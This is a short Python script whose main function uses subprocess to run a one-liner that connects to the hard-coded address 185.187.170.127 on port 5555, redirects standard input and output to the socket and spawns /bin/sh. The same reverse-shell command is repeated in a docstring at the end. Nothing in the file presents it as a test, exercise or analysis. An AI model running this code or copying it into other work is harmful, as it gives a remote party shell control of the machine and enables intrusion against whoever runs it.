import subprocess


def main():
    try:
        result = subprocess.check_output(
            """python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""",
            shell=True,
            stderr=subprocess.STDOUT,
            text=True
        )
        return result
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"


if __name__ == "__main__":
    main()

"""
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
"""